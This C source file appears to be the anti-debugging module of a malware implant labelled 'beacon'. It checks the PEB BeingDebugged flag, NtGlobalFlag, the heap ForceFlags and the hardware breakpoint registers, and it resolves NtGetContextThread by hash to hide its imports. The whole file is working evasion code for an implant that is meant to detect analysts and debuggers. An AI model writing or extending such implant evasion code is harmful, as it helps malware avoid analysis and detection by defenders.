// Anti-debug checks.
//
// Checks four indicators in order (fast to slow):
//   1. PEB->BeingDebugged flag
//   2. NtGlobalFlag (heap flags set by debugger to 0x70)
//   3. Heap magic flags (ForceFlags != 0 under debugger)
//   4. Hardware breakpoints via NtGetContextThread
//
// Returns 1 if a debugger is detected, 0 otherwise.

#include "../core/beacon.h"
#include <winternl.h>
#include <intrin.h> // __readgsqword compiler intrinsic

// NtGetContextThread not in our vtbl yet — resolve dynamically.
typedef NTSTATUS (NTAPI *pNtGetContextThread)(HANDLE, PCONTEXT);

static int check_peb_flag(void) {
    // PEB is at GS:[0x60] on x64.
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    if (peb->BeingDebugged) return 1;

    // NtGlobalFlag: 0xBC on x64, 0x68 on x86
#ifdef _WIN64
    ULONG global_flag = *(ULONG*)((uint8_t*)peb + 0xBC);
#else
    ULONG global_flag = *(ULONG*)((uint8_t*)peb + 0x68);
#endif
    if (global_flag & 0x70) return 1;

    // Heap ForceFlags: x64 Win10+ uses offset 0x74, x86 uses 0x44.
    PVOID heap = GetProcessHeap();
    if (heap) {
#ifdef _WIN64
        ULONG force_flags = *(ULONG*)((uint8_t*)heap + 0x74);
#else
        ULONG force_flags = *(ULONG*)((uint8_t*)heap + 0x44);
#endif
        if (force_flags) return 1;
    }
    return 0;
}

static int check_hardware_bp(void) {
    static void* nt_ctx_fn = NULL;
    if (!nt_ctx_fn) {
        nt_ctx_fn = api_resolve(api_hash_w(L"ntdll.dll"),
                                api_hash("NtGetContextThread"));
    }
    if (!nt_ctx_fn) return 0;
    pNtGetContextThread NtGetContextThread_f = (pNtGetContextThread)nt_ctx_fn;

    CONTEXT ctx;
    rt_memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (NtGetContextThread_f(GetCurrentThread(), &ctx) != 0) return 0;
    if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 1;
    return 0;
}

int opsec_is_debugged(void) {
    if (check_peb_flag()) {
        bdbg("[beacon] antidbg: PEB/heap flag triggered\n");
        return 1;
    }
    if (check_hardware_bp()) {
        bdbg("[beacon] antidbg: hardware breakpoint detected\n");
        return 1;
    }
    bdbg("[beacon] antidbg: clean\n");
    return 0;
}
